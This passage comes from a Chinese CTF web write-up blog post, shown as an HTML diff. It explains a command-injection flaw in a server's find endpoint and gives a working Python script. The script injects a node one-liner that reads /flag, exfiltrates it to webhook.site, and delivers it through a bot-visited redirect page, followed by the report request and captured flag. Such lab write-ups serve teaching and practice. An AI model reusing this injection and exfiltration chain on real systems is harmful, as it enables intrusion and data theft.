  args.<span class="title function_">push</span>(<span class="string">&quot;--&quot;</span>)</span><br><span class="line">    args.<span class="title function_">push</span>(input.<span class="property">pattern</span>)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> command = args.<span class="title function_">join</span>(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> $<span class="string">`<span class="subst">$&#123;&#123; raw: command &#125;&#125;</span>`</span>.<span class="title function_">cwd</span>(input.<span class="property">cwd</span>).<span class="title function_">quiet</span>().<span class="title function_">nothrow</span>()</span><br><span class="line">    <span class="keyword">if</span> (result.<span class="property">exitCode</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> []</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle both Unix (\n) and Windows (\r\n) line endings</span></span><br><span class="line">    <span class="keyword">const</span> lines = result.<span class="title function_">text</span>().<span class="title function_">trim</span>().<span class="title function_">split</span>(<span class="regexp">/\r?\n/</span>).<span class="title function_">filter</span>(<span class="title class_">Boolean</span>)</span><br><span class="line">    <span class="comment">// Parse JSON lines from ripgrep output</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lines</span><br><span class="line">      .<span class="title function_">map</span>(<span class="function">(<span class="params">line</span>) =&gt;</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(line))</span><br><span class="line">      .<span class="title function_">map</span>(<span class="function">(<span class="params">parsed</span>) =&gt;</span> <span class="title class_">Result</span>.<span class="title function_">parse</span>(parsed))</span><br><span class="line">      .<span class="title function_">filter</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> r.<span class="property">type</span> === <span class="string">&quot;match&quot;</span>)</span><br><span class="line">      .<span class="title function_">map</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> r.<span class="property">data</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>会把pattern参数拼进命令参数数组后执行，然后我们寻找一下调用路由<br><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260405165115940.png" alt="image.png"></p>
+<p>相当于可以直接访问自身的4096端口去RCE了。</p>
+<p>接下来我们让 bot 浏览器访问容器内 <code>http://127.0.0.1:4096/find?pattern=...</code>，触发命令注入并外带 flag。</p>
+<p>接下来我们生成一下恶意pagedrop页面：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, urllib.parse, base64</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;2fa9a5ce-bbdc-429d-b929-def86c72a3ea&quot;</span></span><br><span class="line">marker = <span class="string">&quot;flag30709_manual&quot;</span></span><br><span class="line"></span><br><span class="line">js = (</span><br><span class="line">    <span class="string">&quot;const fs=require(&#x27;fs&#x27;),http=require(&#x27;http&#x27;);&quot;</span></span><br><span class="line">    <span class="string">&quot;try&#123;fs.chmodSync(&#x27;/flag&#x27;,0o644)&#125;catch(e)&#123;&#125;;&quot;</span></span><br><span class="line">    <span class="string">&quot;let d=&#x27;&#x27;;&quot;</span></span><br><span class="line">    <span class="string">&quot;try&#123;d=fs.readFileSync(&#x27;/flag&#x27;,&#x27;utf8&#x27;)&#125;catch(e)&#123;d=&#x27;ERR:&#x27;+e.message&#125;;&quot;</span></span><br><span class="line">    <span class="string">f&quot;http.get(&#x27;http://webhook.site/<span class="subst">&#123;token&#125;</span>?p=<span class="subst">&#123;marker&#125;</span>&amp;d=&#x27;+encodeURIComponent(d));&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;node -e &quot;&#x27;</span> + js.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>) + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">pattern = <span class="string">f&quot;x;<span class="subst">&#123;cmd&#125;</span>;#&quot;</span></span><br><span class="line">target = <span class="string">&quot;http://127.0.0.1:4096/find?pattern=&quot;</span> + urllib.parse.quote(pattern, safe=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">html = <span class="string">f&quot;&lt;script&gt;location=atob(&#x27;<span class="subst">&#123;base64.b64encode(target.encode()).decode()&#125;</span>&#x27;)&lt;/script&gt;&quot;</span></span><br><span class="line">r = requests.post(<span class="string">&quot;https://pagedrop.dev/api/v1/sites&quot;</span>, json=&#123;<span class="string">&quot;html&quot;</span>: html&#125;, timeout=<span class="number">30</span>)</span><br><span class="line">r.raise_for_status()</span><br><span class="line"><span class="built_in">print</span>(r.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;url&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>执行后获得pagedrop地址：<a target="_blank" rel="noopener" href="https://pagedrop.dev/s/VCtim47a">https://pagedrop.dev/s/VCtim47a</a></p>
+<p>然后report一下。<br><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260405172604276.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /report HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Host: 8.217.136.100:8000</span><br><span class="line"></span><br><span class="line">&#123;&quot;url&quot;: &quot;http://token-pluginhasecom.pages.dev/?url=&#123;&#123;urlenc(https://pagedrop.dev/s/VCtim47a)&#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发送成功，去webhook等待。<br><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260405172654813.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6e4a071a-d26e-4fe4-a888-6b42742c819f&#125;</span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Meteor_Kai</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://meteorkai.github.io/2026/04/20/2026NCTF-web-wp/">http://meteorkai.github.io/2026/04/20/2026NCTF-web-wp/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>CyberSecurity brings me great joy!</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/wp/"># wp</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>路 </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2026/02/10/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/">fastjson反序列化深入浅出</a>
+            
+        </section>
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Meteor_Kai | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">
+            访客数：<span id="busuanzi_value_site_uv"></span>
+        </span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_pv">
+            总访问量：<span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    <!-- 不蒜子计数器 -->
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</footer>
+
+    </div>
+</body>
+
+</html>
